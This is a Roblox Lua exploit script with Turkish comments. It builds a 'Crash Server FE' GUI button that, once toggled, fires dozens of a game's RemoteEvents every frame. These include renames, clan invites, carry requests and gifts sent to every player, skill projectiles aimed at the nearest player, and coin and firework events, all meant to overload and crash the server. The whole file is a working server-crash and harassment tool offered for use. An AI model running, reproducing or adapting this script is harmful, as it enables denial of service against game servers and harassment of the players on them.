-- FE Sürüklenebilir XXXHUB Crash Menü
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "XXXHUB_CRASH_GUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 300, 0, 100)
frame.Position = UDim2.new(0.5, -150, 0.2, 0)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.Active = true
frame.Draggable = true

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(1, -20, 0, 50)
button.Position = UDim2.new(0, 10, 0, 25)
button.Text = "🔥 Crash Server FE 🔥"
button.TextColor3 = Color3.fromRGB(255, 255, 0)
button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
button.Font = Enum.Font.GothamBlack
button.TextSize = 16

local toggled = false
button.MouseButton1Click:Connect(function()
	toggled = not toggled
	if toggled then
		local Players = game:GetService("Players")
		local LocalPlayer = Players.LocalPlayer
		local RunService = game:GetService("RunService")

		local function getNearestPosition()
			local closest, dist = nil, math.huge
			for _, plr in pairs(Players:GetPlayers()) do
				if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					local d = (plr.Character.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
					if d < dist then
						dist = d
						closest = plr.Character.HumanoidRootPart.Position
					end
				end
			end
			return closest or Vector3.new()
		end

		-- Tek Seferlik Kodlar
		game.ReplicatedStorage.Events.PLAYEvent:FireServer("76074204539378 ")
		game.ReplicatedStorage.Events.PetEvent:FireServer("baby_elephant", "elephant13")

		-- Sürekli Çalışacak Loop
		local loopConnection
		loopConnection = RunService.Heartbeat:Connect(function()
			game.ReplicatedStorage.Events.nameEvent:FireServer("XXXHUB CRASH SERVER ", "player")
			game.ReplicatedStorage.Events.nameEvent:FireServer("CRASHHHHHH", "player")

			game.ReplicatedStorage.Events.nameEvent:FireServer("XXXHUB CRASH SERVER ", "pet")
			game.ReplicatedStorage.Events.nameEvent:FireServer("EZ NUKER BY XXXHUB", "pet")

			game.ReplicatedStorage.Events.ClanEvent:FireServer({
				["clanToCreate"] = "CRASH BY XXXHUB 🧹",
				["action"] = "create_clan",
				["ClanIcon"] = "107021325188504"
			})

			for _, plr in pairs(Players:GetPlayers()) do
				game.ReplicatedStorage.invitationEvent:FireServer({
					["action"] = "invite_clan",
					["oplr"] = plr
				})
				game.ReplicatedStorage.Events.CarryEvent:FireServer(plr, "request_carry")

				game.ReplicatedStorage.Events.GiveEvent:FireServer({
					["toolname"] = "RoseB",
					["oplr"] = plr,
					["action"] = "give",
					["gift"] = "🧹"
				})
				game.ReplicatedStorage.Events.GiveEvent:FireServer({
					["toolname"] = "Chickenleg",
					["oplr"] = plr,
					["action"] = "give",
					["gift"] = "🍗"
				})
				game.ReplicatedStorage.Events.GiveEvent:FireServer({
					["toolname"] = "RoseB",
					["gift"] = "NİCRASH BY XXXHUB",
					["oplr"] = plr,
					["action"] = "give"
				})
			end

			local pos = getNearestPosition()
			game.ReplicatedStorage.SkillsInRS.RemoteEvent:FireServer(pos, "NewFireball")
			game.ReplicatedStorage.SkillsInRS.RemoteEvent:FireServer(pos, "NewLightningball")

			local titles = {"Executioner", "Destroyer", "MasterHunter", "AdeptHunter"}
			for _, title in ipairs(titles) do
				game.ReplicatedStorage.Events.TitleEvent:FireServer(title)
			end

			game.ReplicatedStorage.Events.CoinEvent:FireServer()
			game.ReplicatedStorage.Events.FireworksEvent:FireServer()
		end)

		button.Text = "🛑 DURDUR"
		button.BackgroundColor3 = Color3.fromRGB(150, 0, 0)

		button.MouseButton1Click:Connect(function()
			if toggled then
				loopConnection:Disconnect()
				toggled = false
				button.Text = "🔥 Crash Server FE 🔥"
				button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
			end
		end)
	end
end)
